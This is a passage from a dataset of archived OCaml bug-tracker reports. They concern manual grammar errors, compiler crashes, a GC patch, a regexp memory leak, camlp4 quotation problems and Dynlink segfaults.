\"argument\" in this\nproduction for class-binding in Section 6.9.3 of the document:\n\n   class_binding ::= \n      [virtual] [[type-parameters]] class_name {pattern} [:class-type] = \n      class-expr\n \n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1666\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n\"initializer\" missing from the keyword list in the document, but it\ndoes appear in the grammar for class definitions:\n\n   class foo = object initializer print_string \"Hi.\\n\" end;;\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1665\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: David Brown\nVersion: 3.05 (CVS too)\nOS: Linux\nSubmission from: 66-75-152-1.san.rr.com (66.75.152.1)\n\n\nThe function stat_aux in otherlibs/unix/stat.c has a GC problem when using 64\nbit file offsets.  The following patch seems to fix the problem.\n\nIndex: stat.c\n===================================================================\nRCS file: /caml/ocaml/otherlibs/unix/stat.c,v\nretrieving revision 1.14\ndiff -u -r1.14 stat.c\n--- stat.c      2002/09/27 08:32:28     1.14\n+++ stat.c      2003/05/01 04:40:26\n@@ -48,11 +48,13 @@\n {\n   value v;\n   value atime = Val_unit, mtime = Val_unit, ctime = Val_unit;\n+  value offset = Val_unit;\n\n-  Begin_roots3(atime,mtime,ctime)\n+  Begin_roots4(atime,mtime,ctime,offset)\n     atime = copy_double((double) buf->st_atime);\n     mtime = copy_double((double) buf->st_mtime);\n     ctime = copy_double((double) buf->st_ctime);\n+    offset = use_64 ? Val_file_offset (buf->st_size) : Val_int (buf->st_size); \n   v = alloc_small(12, 0);\n     Field (v, 0) = Val_int (buf->st_dev);\n     Field (v, 1) = Val_int (buf->st_ino);\n@@ -63,8 +65,7 @@\n     Field (v, 5) = Val_int (buf->st_uid);\n     Field (v, 6) = Val_int (buf->st_gid);\n     Field (v, 7) = Val_int (buf->st_rdev);\n-    Field (v, 8) =\n-      use_64 ? Val_file_offset(buf->st_size) : Val_int (buf->st_size);\n+    Field (v, 8) = offset;\n     Field (v, 9) = atime;\n     Field (v, 10) = mtime;\n     Field (v, 11) = ctime;\n"},{"labels":["bug"],"text":"**Original bug ID:** 1664\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIn the production for class-field, the grammar at\nhttp://caml.inria.fr/ocaml/htmlman/manual017.html says that arguments\nfollowing a method-name must be patterns.  This would disallow keyword\narguments to methods, such as\n\n   class foo = object method bar ~baz = 0 + baz end;;\n\nwhich are accepted by OCAML.  I think the occurrence of \"pattern\" in\n\n   class-field ::= ...\n                 | method [private] method-name {pattern} [:typexpr] = expr\n\nshould be replaced with \"argument\".\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1663\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Brian Rogoff\nVersion: 3.06\nOS: Solaris\nSubmission from: 192-149-105-50.artisan.com (192.149.105.50)\n\n\nCompile this module, either at the top level, or with ocamlc or ocamlopt, as\nfile \nfoo.mli. \n\nmodule type BAD = sig type t = u and u = t end\n\nand you get a Stack_overflow. \n\nThe slightly different module \n\nmodule type BAD' = sig type t = u*u and u = t * t end ;;\n\ndoesn't cause the Stack_overflow.\n\n-- Brian\n"},{"labels":["bug"],"text":"**Original bug ID:** 1662\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nOCaml 3.04, 3.06 ou 3.06+25 (2003-03-13)\n\n> ocaml\n# float_of_string \"\";;\n- : float = 0.\n# int_of_string \"\";;\nException: Failure \"int_of_string\".\n# float_of_string \" \";;\nException: Failure \"float_of_string\".\n\nC'est pas trÃ¨s consistant. Pourquoi on n'a pas une exception\nInvalid_argument \"float_of_string\" avec float_of_string sur la chaine vide ?\n\n-- \nMaxence\n"},{"labels":["bug"],"text":"**Original bug ID:** 1660\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe manual at http://caml.inria.fr/ocaml/htmlman/manual009.html omits\n\"object\" from the list of keywords.\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1657\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n[probably in the harmless oddities section , but still..]\n\nIf i invoke ocamlc with the same compilation unit multiple times (which \narguably is a mistake) it accepts it. ocamlopt does not.\n\n\n[henri@ffnet: ~/newwork/caml] ocamlopt misc/misc.ml misc/misc.ml \nFiles misc/misc.cmx and misc/misc.cmx both define a module named Misc\n[henri@ffnet: ~/newwork/caml] ocamlc misc/misc.ml misc/misc.ml \n[henri@ffnet: ~/newwork/caml]\n"},{"labels":["bug"],"text":"**Original bug ID:** 1656\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n[This bug probably goes in the 'harmless oddities' section, but nonetheless]\n\n  I noticed in the toplevel that after having run out of file descriptors, I\n  couldn't declare a new class. \n  \n[henri@ffnet: ~/newwork/caml] ocaml bug.ml\nI/O error: /usr/lib/ocaml/camlinternalOO.cmi: Too many open files\n\n\n  However, if i compile this snippet with ocamlc and run the binary, the class\n  declaration works fine.\n\n\n\nbug.ml:\n\nlet _ = \nbegin\ntry \nfor i = 1 to 3000 do \n  ignore (open_in \"/home/henri/work/150th/coordinates.txt\")\ndone\nwith _ -> ();\nend;\n\n\nclass t1  = object method id = 3 end;;\n"},{"labels":["bug"],"text":"**Original bug ID:** 1654\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThis program leaks 10mb/sec on my machine with ocamlopt 3.06 (msvc, xp).\n\nlet _ =\n   while true do\n     let re = Str.regexp \"foo\" in ()\n   done;\n   ()\n\nInserting a call to Gc.compact in the loop doesn't affect it (well, it \nslows the loop down a bit so the leak rate drops :).\n\n From a brief trip in the debugger and a glance at strstubs.cpp it appears \nthe custom finalizer is being called.  I didn't grovel in the actual regex \ncode to see where the leak was (assuming it's not my bug and I'm supposed \nto free the regex somehow in caml code).\n\nI also notice that the strstubs.c has the same problem I reported in \nbigarray (and that was fixed, bug #601) about using stat_alloc() to \nallocate but free() to deallocate, so it should probably be fixed here as \nwell, assuming Str is going to live much longer.\n\nChris\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 1651\n**Reporter:** administrator\n**Status:** resolved (set by @damiendoligez on 2012-09-11T07:18:11Z)\n**Resolution:** suspended\n**Priority:** normal\n**Severity:** minor\n**Category:** documentation\n**Monitored by:** \"Hendrik Tews\" smithjoshuab\n\n## Bug description\n\nHi,\r\n\r\nAppendix A (quotations) of the camlp4 reference manual is\r\nincorrect or incomplete in the following cases:\r\n\r\n1. there are no quotations documented for the two types \r\n   MLast.row_field and MLast.with_constr. Further there is no\r\n   location function \"loc_of_...\" defined for these two types. \r\n\r\n\r\n2. for the following constructors from MLast there is no\r\n   quotation or the given quotation contains errors:\r\n\r\nExVrn (_, _)\r\nExSnd (_, _, _)\r\nExOvr (_, _)\r\nExOlb (_, _, _)\r\nExNew (_, _)\r\nExLmd (_, _, _, _)\r\nPaVrn (_, _)\r\nPaTyp (_, _)\r\nPaRec (_, _)\r\nPaOlb (_, _, _, _)\r\nPaLab (_, _, _)\r\nPaFlo (_, _)\r\nPaArr (_, _)\r\nTyObj (_, _, true)\r\nSgInc (_, _)\r\nSgDir (_, _, _)\r\nSgClt (_, _)\r\nSgCls (_, _)\r\nStInc (_, _)\r\nStDir (_, _, _)\r\nStClt (_, _)\r\nStCls (_, _)\r\nMeTyc (_, _, _)\r\nCtSig (_, _, _)\r\nCrMth (_, _, _, _, _)\r\n\r\n\r\n3. the following quotations do not work as given, they produce\r\n   the following error messages:\r\n\r\n<:patt< { $ppl$ } >>: record.\r\nParse error: '=' expected after [patt_label_ident] (in [label_patt])\r\n\r\n<:module_expr< ( $me$ : $mt$ ) ] >>: module type constraint.\r\nParse error: end of input expected after [module expression] (in [module\r\n  expression])\r\n\r\n<:class_type< object $s$ $list:csil$ end >>: class object type\r\nParse error: ';' expected after [class signature item] (in [class\r\ntype])\r\n\r\n<:class_str_item< method $s$ : $t$ >>: method.\r\nParse error: '=' expected after [type] (in [class structure item])\r\n\r\n\r\n<:class_str_item< method private $s$ : $t$ >>: private method.\r\nParse error: '=' expected after [type] (in [class structure item])\r\n\r\n4. the quotation\r\n\r\n<:class_sig_item< value $mut:m$ $s$ = $t$ >>: value.\r\n\r\n   should be \r\n\r\n<:class_sig_item< value $mut:m$ $s$ : $t$ >> ....\r\n\r\n\r\nFor the compilation of these errors I used the attached ocaml\r\nfile. It would be nice if the next camlp4 release would contain\r\nan example file with a complete pattern match over the syntax\r\ntree written entirely with quotations.\r\n\r\n\r\nBye,\r\n\r\nHendrik\r\n\r\n\r\n----------------\r\n\r\n(* A.2 Quotation expr *)\r\n\r\nlet f = function\r\n  | <:expr< $e1$ . $e2$ >> -> ()\r\n  | <:expr< $anti:e$ >> -> ()\r\n  | <:expr< $e1$ $e2$ >> -> ()\r\n  | <:expr< $e1$ .( $e2$ ) >> -> ()\r\n  | <:expr< [| $list:el$ |] >> -> ()\r\n  | <:expr< $e1$ := $e2$ >> -> ()\r\n  | <:expr< $chr:c$ >> -> ()\r\n\r\n(* in new version *)\r\n  | <:expr< ($e$ :> $t$) >> -> ()\r\n  | <:expr< ($e$ : $t1$ :> $t2$) >> -> ()\r\n\r\n  | <:expr< $flo:s$ >> -> ()\r\n  | <:expr< for $s$ = $e1$ $to:b$ $e2$ do { $list:el$ } >> -> ()\r\n  | <:expr< fun [ $list:pwel$ ] >> -> ()\r\n  | <:expr< if $e1$ then $e2$ else $e3$ >> -> ()\r\n  | <:expr< $int:s$ >> -> ()\r\n\r\n(* in new version *)\r\n  | <:expr< ~ $i$ : $e$ >> -> ()\r\n  | <:expr< lazy $e$ >> -> ()\r\n\r\n  | <:expr< let $rec:b$ $list:pel$ in $e$ >> -> ()\r\n  | <:expr< $lid:s$ >> -> ()\r\n  | <:expr< match $e$ with [ $list:pwel$ ] >> -> ()\r\n  | <:expr< { $list:eel$ } >> -> ()\r\n  | <:expr< do { $list:el$ } >> -> ()\r\n  | <:expr< $e1$ .[ $e2$ ] >> -> ()\r\n  | <:expr< $str:s$ >> -> ()\r\n  | <:expr< try $e$ with [ $list:pwel$ ] >> -> ()\r\n  | <:expr< ( $list:el$ ) >> -> ()\r\n  | <:expr< ( $e$ : $t$ ) >> -> ()\r\n  | <:expr< $uid:s$ >> -> ()\r\n  | <:expr< while $e$ do { $list:el$ } >> -> ()\r\n\r\n(* missing\r\n(ExVrn (_, _)|ExSnd (_, _, _)|ExOvr (_, _)|ExOlb (_, _, _)|ExNew (_, _)|\r\nExLmd (_, _, _, _))\r\n*)\r\n\r\n\r\n\r\n\r\n\r\n(* A.3 Quotation patt *)\r\n\r\nlet f = function\r\n  | <:patt< $p1$ . $p2$ >> -> ()\r\n  | <:patt< $anti:e$ >> -> ()\r\n  | <:patt< ( $p1$ as $p2$ ) >> -> ()\r\n  | <:patt< _ >> -> ()\r\n  | <:patt< $p1$ $p2$ >> -> ()\r\n  | <:patt< $chr:c$ >> -> ()\r\n  | <:patt< $int:s$ >> -> ()\r\n  | <:patt< $lid:i$ >> -> ()\r\n  | <:patt< $p1$ | $p2$ >> -> ()\r\n  | <:patt< $p1$ .. $p2$ >> -> ()\r\n\r\n  (* | <:patt< { $ppl$ } >> -> () *)\r\n(* error message \r\nParse error: '=' expected after [patt_label_ident] (in [label_patt])\r\n*)\r\n\r\n  | <:patt< $str:s$ >> -> ()\r\n  | <:patt< ( $list:pl$ ) >> -> ()\r\n  | <:patt< ( $p$ : $t$ ) >> -> ()\r\n  | <:patt< $uid:s$ >> -> ()\r\n\r\n(*missing\r\n(PaVrn (_, _)|PaTyp (_, _)|PaRec (_, _)|PaOlb (_, _, _, _)|PaLab (_, _, _)|\r\nPaFlo (_, _)|PaArr (_, _))\r\n*)\r\n\r\n\r\n\r\n(* A.5 Quotation ctyp *)\r\n\r\nlet f = function\r\n  | <:ctyp< $t1$ . $t2$ >> -> ()\r\n  | <:ctyp< $t1$ as $t2$ >> -> ()\r\n  | <:ctyp< _ >> -> ()\r\n  | <:ctyp< $t1$ $t2$ >> -> ()\r\n  | <:ctyp< $t1$ -> $t2$ >> -> ()\r\n  | <:ctyp< # $list:sl$ >> -> ()\r\n  | <:ctyp< ~ $s$ : $t$ >> -> ()\r\n  | <:ctyp< $lid:s$ >> -> ()\r\n  | <:ctyp< $t1$ == $t2$ >> -> ()\r\n  | <:ctyp< < $list:fl$ > >> -> ()\r\n  | <:ctyp< ? $s$ : $t$ >> -> ()\r\n\r\n(* was\r\n  | <:ctyp< ! $list:sl$ : $t$ >> -> ()\r\n but fixed in new docs *)\r\n\r\n  | <:ctyp< ! $list:sl$ . $t$ >> -> ()\r\n\r\n  | <:ctyp< '$s$ >> -> ()\r\n  | <:ctyp< { $list:sbtl$ } >> -> ()\r\n  | <:ctyp< [ $list:stll$ ] >> -> ()\r\n  | <:ctyp< ( $list:tl$ ) >> -> ()\r\n  | <:ctyp< $uid:s$ >> -> ()\r\n  | <:ctyp< [| $list:rfl$ |] >> -> ()\r\n(*missing\r\nTyObj (_, _, true)\r\n*)\r\n\r\n\r\n\r\n(* A.6 Quotation sig_item *)\r\n\r\nlet f = function\r\n  | <:sig_item< declare $list:sil$ end >> -> ()\r\n  | <:sig_item< exception $s$ of $list:tl$ >> -> ()\r\n  | <:sig_item< external $s$ : $t$ = $list:sl$ >> -> ()\r\n  | <:sig_item< module $s$ : $mt$ >> -> ()\r\n  | <:sig_item< module type $s$ = $mt$ >> -> ()\r\n  | <:sig_item< open $sl$ >> -> ()\r\n  | <:sig_item< type $list:sslt$ >> -> ()\r\n  | <:sig_item< value $s$ : $t$ >> -> ()\r\n(* missing\r\n(SgInc (_, _)|SgDir (_, _, _)|SgClt (_, _)|SgCls (_, _))\r\n*)\r\n\r\n\r\n(* A.7 Quotation str_item *)\r\n\r\nlet f = function\r\n  | <:str_item< declare $list:stl$ end >> -> ()\r\n  | <:str_item< exception $s$ of $list:tl$ >> -> ()\r\n  | <:str_item< $exp:e$ >> -> ()\r\n  | <:str_item< external $s$ : $t$ = $list:sl$ >> -> ()\r\n  | <:str_item< module $s$ = $me$ >> -> ()\r\n  | <:str_item< module type $s$ = $mt$ >> -> ()\r\n  | <:str_item< open $sl$ >> -> ()\r\n  | <:str_item< type $list:sslt$ >> -> ()\r\n  | <:str_item< value $rec:b$ $list:pel$ >> -> ()\r\n(*missing\r\n(StInc (_, _)|StDir (_, _, _)|StClt (_, _)|StCls (_, _))\r\n*)\r\n\r\n\r\n\r\n\r\n(* A.8 Quotation module_type *)\r\n\r\nlet f = function\r\n  | <:module_type< $mt1$ . $mt2$ >> -> ()\r\n  | <:module_type< $mt1$ $mt2$ >> -> ()\r\n  | <:module_type< functor ( $s$ : $mt1$ ) -> $mt2$ >> -> ()\r\n  | <:module_type< $lid:i$ >> -> ()\r\n\r\n(* in new version *)\r\n  | <:module_type< '$i$ >> -> ()\r\n\r\n  | <:module_type< sig $list:sil$ end >> -> ()\r\n  | <:module_type< $uid:i$ >> -> ()\r\n  | <:module_type< $mt$ with $list:wcl$ >> -> ()\r\n\r\n\r\n(* A.9 Quotation module_expr *)\r\n\r\nlet f = function\r\n  | <:module_expr< $me1$ . $me2$ >> -> ()\r\n  | <:module_expr< $me1$ $me2$ >> -> ()\r\n  | <:module_expr< functor ( $s$ : $mt$ ) -> $me$ >> -> ()\r\n  | <:module_expr< struct $list:stl$ end >> -> ()\r\n\r\n(*\r\n  | <:module_expr< ( $me$ : $mt$ ) ] >> -> ()\r\n\r\nerror :\r\nParse error: end of input expected after [module expression] (in [module\r\n  expression])\r\n*)\r\n\r\n  | <:module_expr< $uid:i$ >> -> ()\r\n(*missing\r\nMeTyc (_, _, _)\r\n*)\r\n\r\n\r\n(* A.10 Quotation class_expr *)\r\n\r\nlet f = function\r\n  | <:class_expr< $ce$ $e$ >> -> ()\r\n  | <:class_expr< $list:sl$ [ $list:tl$ ] >> -> ()\r\n  | <:class_expr< fun $p$ -> $ce$ >> -> ()\r\n  | <:class_expr< let $rec:b$ $list:lb$ in $ce$ >> -> ()\r\n  | <:class_expr< object $p$ $list:csil$ end >> -> ()\r\n  | <:class_expr< ( $ce$ : $ct$ ) >> -> ()\r\n\r\n\r\n(* A.11 Quotation class_type *)\r\n\r\nlet f = function\r\n  | <:class_type< $list:sl$ [ $list:tl$ ] >> -> ()\r\n  | <:class_type< [ $t$ ] -> $ct$ >> -> ()\r\n\r\n(* \r\n  | <:class_type< object $s$ $list:csil$ end >> -> ()\r\nerror:\r\nParse error: ';' expected after [class signature item] (in [class type])\r\n*)\r\n(* missing\r\nCtSig (_, _, _)\r\n*)\r\n\r\n\r\n(* A.12 Quotation class_sig_item *)\r\n\r\nlet f = function\r\n  | <:class_sig_item< type $t1$ = $t2$ >> -> ()\r\n  | <:class_sig_item< declare $list:csil$ end >> -> ()\r\n  | <:class_sig_item< inherit $ct$ >> -> ()\r\n  | <:class_sig_item< method $s$ : $t$ >> -> ()\r\n  | <:class_sig_item< method private $s$ : $t$ >> -> ()\r\n\r\n(*\r\n  | <:class_sig_item< value $mut:m$ $s$ = $t$ >> -> ()\r\nerror\r\nParse error: ':' expected after [label] (in [class signature item])\r\n\r\nshould be\r\n*)\r\n  | <:class_sig_item< value $mut:m$ $s$ : $t$ >> -> ()\r\n\r\n\r\n  | <:class_sig_item< method virtual $s$ : $t$ >> -> ()\r\n  | <:class_sig_item< method virtual private $s$ : $t$ >> -> ()\r\n\r\n\r\n(* A.13 Quotation class_str_item *)\r\n\r\nlet f = function\r\n  | <:class_str_item< declare $list:csil$ end >> -> ()\r\n  | <:class_str_item< type $t1$ = $t2$ >> -> ()\r\n  | <:class_str_item< inherit $ct$ >> -> ()\r\n  | <:class_str_item< initializer $e$ >> -> ()\r\n\r\n(*\r\n  | <:class_str_item< method $s$ : $t$ >> -> ()\r\nerror\r\nParse error: '=' expected after [type] (in [class structure item])\r\n*)\r\n\r\n(*\r\n  | <:class_str_item< method private $s$ : $t$ >> -> ()\r\nerror\r\nParse error: '=' expected after [type] (in [class structure item])\r\n*)\r\n\r\n  | <:class_str_item< method virtual $s$ : $t$ >> -> ()\r\n  | <:class_str_item< method virtual private $s$ : $t$ >> -> ()\r\n  | <:class_str_item< value $mut:m$ $s$ = $t$ >> -> ()\r\n(*missing\r\nCrMth (_, _, _, _, _)\r\n*)\r\n\r\n\r\n(* missing types \r\nand row_field =\r\n\r\nand with_constr =\r\n *)\r\n\r\n(*** Local Variables: ***)\r\n(*** version-control: t ***)\r\n(*** kept-new-versions: 5 ***)\r\n(*** compile-command: \"ocamlc -pp \\\"camlp4o q_MLast.cmo\\\" -c -I \\\"`camlp4 -where`\\\" quotation_test.ml\" ***)\r\n(*** delete-old-versions: t ***)\r\n(*** End: ***)\r\n----------------\r\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1650\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Daniel Weil\nVersion: 3.06\nOS: Windows (and RedHat)\nSubmission from: pat-aty.gre.completel.fr (213.30.140.146)\n\n\nI have to make a library that make callbacks from C to OCAML and that must be\ncompiled with the /MD option.\n\nFor this, I need to compile the OCAML compiler (bytecode and nativecode) with\nthe /MD option of VisalC++ on Windows.\n\nWell, I changed the option from /MT to /MD in the config/Makefile. But it seems\nthat is not enough. I still  have problems due to incoherence between dllimpoty\nand dllexport stuffs (this happens in the asmrun directory). I've been trying to\nfix it myself but i'm giving up!\n\nCan anybody help me ? I'm sure that I'm not the first to do that.\n\nDaniel Weil\n"},{"labels":["bug"],"text":"**Original bug ID:** 1649\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFrom: vanicat@labri.fr\n\n> il semble que ce soit \"juste\" un probleme d'affichage du type.\n\nEn effet, c'est juste un probleme d'affichage.\nMais ce rapport m'a mis dans la confusion la plus complete: j'ai mis\nune heure avant de comprendre que le type affiche' etait incorrect.\n\nJ'ai corrige' et ca sera en CVS des que pauillac sera debout.\n\n     Jacques\n"},{"labels":["bug"],"text":"**Original bug ID:** 1648\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIn test/bdd.ml, I think\n\n  let succeeded = ref true in\n  for i = 1 to ntests do\n    succeeded := !succeeded || (* Look here! *) test_hwb bdd (random_vars n)\n  done;\n\nshould instead read\n\n  let succeeded = ref true in\n  for i = 1 to ntests do\n    succeeded := !succeeded && test_hwb bdd (random_vars n)\n  done;\n\notherwise \"test_hwb\" never gets called and the script is guaranteed to\nprint \"OK\" any time it doesn't fail.\n\nUnfortunately, if I make this change, the script does fail when it\nreferences an array out of bounds.\n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1647\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe documented grammar says that \"let _:int = 3\" is a definition, but\nthe implementation doesn't take it:\n\n   # let _: int = 3;;\n   Characters 5-6:\n     let _: int = 3;;\n          ^\n   Syntax error\n   #  \n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1646\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for Caml light use https://github.com/camllight/camllight/issues\n\n## Bug description\n\nFull_Name: Geert Vernaeve\nVersion: 0.75\nOS: Mandrake, Debian\nSubmission from: ncgent02.telenet-ops.be (213.224.83.78)\n\n\nAttempts to compile contrib/libunix under Linux Mandrake (my system is a\n8.0/8.1/9.0 or something mix) and Debian 3.0 fail when compiling accept.c,\ncomplaining about conflicting declarations for \"memmove\" in string.h. The cause\nis that src/runtime/config.h #define's bcopy() as memmove() and then the system\ninclude file \"string.h\" contains a prototype for bcopy(), which is expanded\nerroneously to memmove().\n\nA quick fix is to comment out the line \"#define bcopy(src,dst,len) memmove(...)\"\nin config.h (the line just after \"#ifdef HAS_MEMMOVE\"). A cleaner fix is\nprobably cleaning up the Makefile but we'll leave that as an exercise for the\ninterested reader :-)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1645\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nAccording to the documented grammar, \"exception true = false\" is a\nsyntactically valid exception definition because \"true\" and \"false\"\nare cconstr-name's.  However, the implementation doesn't accept it:\n\n   # exception true = false;;\n   Characters 10-14:\n     exception true = false;;\n               ^^^^\n   Syntax error\n   #  \n\nI think this should be fixed by making a distinction in the grammar\nbetween user-defined cconstr-name's (which start with uppercase\nletters) and predefined cconstr-name's (which are a fixed list: true,\nfalse, [], ()), and only allowing user-defined cconstr-name's in\nexception definitions.\n\nThis is similar to bug 1628 in that syntactically unique names are\nallowed to appear in places that it only makes sense for uppercase\nidentifiers to appear.\n\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1644\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Stefano Zacchiroli\nVersion: 3.06\nOS: linux\nSubmission from: n32d125.cs.unibo.it (130.136.32.125)\n\n\nOCaml systhread implementation use a code like the following to create new\nthreads:\n\ntry\n fn arg; ()\nwith Thread_exit -> ...\n\nwhere Thread_exit is an exception hidden from Thread.mli. Thread.exit\nimplementation is therefore simply:\n\nlet exit () = raise Thread_exit\n\nThis choices makes really dangerous every \"try ... with _ -> ...\" usage in\nthread code (yes, I know that this is a bad(TM) programming style). I've just\nspent a lot of time debugging a problem like this one. Even worst most of the\n\"with _\" weren't in my code but in other ocaml libraries code.\n\nAnother problem with this approach is the wrapping of exceptions in other\nexception, a commonly used approach (e.g. Pxp_types.At exception of the PXP\nparser, but I'm almost sure there is something like that in camlp4 code).\n\nNow, I know that this is not an OCaml bug, but is really annoying for thread\nprogrammers. I'm wondering if there are other possible solutions.\n\nIs it possible to implement the Thread.exit function so that it doesn't raise an\nexception but invoke directy pthread_exit and perform the needed clean up?\n\nAs a quick fix solution, exporting Thread_exit exception in thread.mli can\npermit the programmer to write something like:\n\ntry\n ...\nwith\n| Thread_exit as e -> raise e\n| _ -> ...\n\nThanks in advance,\nCheers\n"},{"labels":["bug"],"text":"**Original bug ID:** 1642\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\n\"match 3 with _ -> 3\" is an expression, and \"f\" is an expression, so\naccording to the documented grammar \"f match 3 with _ -> 3\" should be\nan expression.  The implementation forces me to parenthesize the match:\n\n   # let f x = x;;\n   val f : 'a -> 'a = <fun>\n   # f match 3 with _ -> 3;;\n   Characters 2-7:\n     f match 3 with _ -> 3;;\n       ^^^^^\n   Syntax error\n   # f (match 3 with _ -> 3);;\n   - : int = 3\n   #  \n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1641\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nIs there any support for cross-compilation for the native code compiler?  \nInterpretation simply won't cut it for the application I'm working with.\n\nThe native code compiler can generate code for many different\narchitectures, and it appears that most of the codegen is written in\nO'Caml itself.  gcc has support for cross-compilation/linking.  Putting\nthese together, virtually all of the work has been done.  Is there\nanything to it other than properly structuring the configuration and \nbuild?\n\n-Andy\n"},{"labels":["bug"],"text":"**Original bug ID:** 1640\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Hans Ole Rafaelsen\nVersion: 3.06\nOS: linux\nSubmission from: itherther.simula.no (129.240.228.187)\n\n\nHello,\n\nseems to be some strange problem when Dynlink.init() is called\nmultiple times.  If the code being loaded contains floating point\noperations the program will crash with segmentation fault.  This\nhappens both if the floating point operations get executed during load\ntime, or if they are within a function which register a handle.  In\nthe later case, it will crash once the loaded function get called.\n\nCode operating on integers or strings does not seems to have this\nproblem.\n\nThe quick fix is to only call Dynlink.init() once :-), but the\nbehavior when it is called multiple times is so strange that I decided\nto fill a bug report on this.\n\n\nKindest regards,\n\nHans Ole Rafaelsen\n\n\nfoo.ml---------------\n\nlet bar_ref = ref (fun () -> ())\n\n\nlet set_bar f =\n  bar_ref := f\n\nlet do_bar () =\n  !bar_ref ()\n\n\nbar.ml---------------\n(* The function *)\nlet f () =\n(*   let _ = (\"dd\" ^ \"aa\") in *)\n(*   let _ = 2 + 4 in *)\n  let _ = 2.0 +. 1.0 in (* Will make the loaded code crash *)\n    ()\n\n(* Register it when loaded *)\nlet _ = \n(*   let _ = 2.0 +. 1.0 in *)\n  Foo.set_bar 